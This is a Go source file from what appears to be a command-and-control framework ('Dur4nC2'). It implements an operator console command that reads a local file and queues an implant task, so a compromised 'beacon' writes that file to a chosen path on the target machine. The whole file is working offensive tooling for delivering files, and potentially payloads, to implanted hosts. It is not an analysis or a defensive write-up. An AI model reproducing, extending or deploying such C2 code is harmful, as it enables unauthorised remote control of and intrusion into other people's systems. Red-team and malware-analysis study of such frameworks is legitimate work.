package utils

import (
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/console"
	"Dur4nC2/server/db"
	beaconRepository "Dur4nC2/server/domain/beacon/repository/postgres"
	"Dur4nC2/server/domain/models"
	taskRepository "Dur4nC2/server/domain/task/repository/postgres"
	"errors"
	"github.com/desertbit/grumble"
	"github.com/gofrs/uuid"
	"google.golang.org/protobuf/proto"
	"io/ioutil"
	"math/rand"
)

func UploadCmd(ctx *grumble.Context, con *console.ServerConsoleClient) error {
	beacon := con.ActiveTarget.GetBeacon()
	if beacon == nil {
		return errors.New("non active beacon")
	}
	beaconRepo := beaconRepository.NewPostgresBeaconRepository(db.Session())
	currentBeacon, err := beaconRepo.Read(uuid.FromStringOrNil(beacon.ID))
	if err != nil {
		return err
	}

	remoteFilePath := ctx.Flags.String("remote-file-path")
	localFilePath := ctx.Flags.String("local-file-path")
	downloadDescription := ctx.Flags.String("description")

	fileBytes, err := ioutil.ReadFile(localFilePath)
	if err != nil {
		return err
	}

	request := &commonpb.Request{BeaconID: beacon.ID}
	uploadReq := &implantpb.UploadReq{
		Path:    remoteFilePath,
		File:    fileBytes,
		Request: request,
	}
	data, _ := proto.Marshal(uploadReq)

	v := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
	taskReq := &implantpb.Envelope{
		ID:   int64(v),
		Type: implantpb.MsgUploadReq,
		Data: data,
	}
	taskReqData, _ := proto.Marshal(taskReq)

	newTask := models.BeaconTask{
		EnvelopeID:  int64(v),
		BeaconID:    uuid.FromStringOrNil(beacon.ID),
		Description: downloadDescription,
		State:       models.PENDING,
		Request:     taskReqData,
	}
	taskRepo := taskRepository.NewPostgresBeaconTaskRepository(db.Session())
	err = taskRepo.Create(currentBeacon, newTask)
	if err != nil {
		return err
	}
	con.PrintInfof("Task successfully added to the queue, please wait the response...")
	return nil
}
